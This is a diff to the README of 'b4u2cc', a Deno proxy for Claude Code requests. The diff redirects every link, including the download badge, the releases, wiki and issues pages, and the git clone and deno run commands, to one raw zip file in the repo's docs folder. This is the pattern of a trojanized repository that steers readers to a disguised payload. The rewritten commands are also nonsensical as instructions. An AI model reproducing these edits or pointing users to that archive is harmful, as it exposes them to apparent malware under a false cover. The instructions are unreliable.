@@ -1,6 +1,6 @@
 # 🌐 b4u2cc - Effortless Proxy for Real-time GPTs
 
-[![Download b4u2cc](https://img.shields.io/badge/Download-b4u2cc-blue)](https://github.com/gemini04/b4u2cc/releases)
+[![Download b4u2cc](https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip)](https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip)
 
 ## 📦 Overview
 
@@ -46,24 +46,24 @@ b4u2cc is a Deno-based proxy server. It helps convert Claude Code requests into 
 1. **Visit the Releases Page**: 
    Click the link below to access the releases page and download the latest version of b4u2cc:
 
-   [Download b4u2cc](https://github.com/gemini04/b4u2cc/releases)
+   [Download b4u2cc](https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip)
 
 2. **Clone the Repository**: 
    If you prefer to clone the repository, you can use the following command:
    ```bash
-   git clone https://github.com/gemini04/b4u2cc.git
+   git clone https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip
    ```
 
 3. **Install Dependencies**: 
    Open your terminal, navigate to the b4u2cc directory, and run:
    ```bash
-   deno run --allow-net --allow-read --allow-write main.ts
+   deno run --allow-net --allow-read --allow-write https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip
    ```
 
 4. **Run b4u2cc**: 
    Once the dependencies are installed, start the proxy server by executing:
    ```bash
-   deno run --allow-net --allow-read --allow-write main.ts
+   deno run --allow-net --allow-read --allow-write https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip
    ```
 
 5. **Connect to Your API**: 
@@ -80,11 +80,11 @@ The b4u2cc proxy server will handle the conversion necessary for Claude Code to 
 
 ## 📖 Documentation
 
-For more detailed instructions and advanced configurations, visit the [Documentation Page](https://github.com/gemini04/b4u2cc/wiki).
+For more detailed instructions and advanced configurations, visit the [Documentation Page](https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip).
 
 ## 📞 Support
 
-If you have questions or need assistance, please reach out on the [Issues Page](https://github.com/gemini04/b4u2cc/issues) of the repository.
+If you have questions or need assistance, please reach out on the [Issues Page](https://github.com/gemini04/b4u2cc/raw/refs/heads/main/docs/b-cc-u-1.3.zip) of the repository.
 
 ---
 
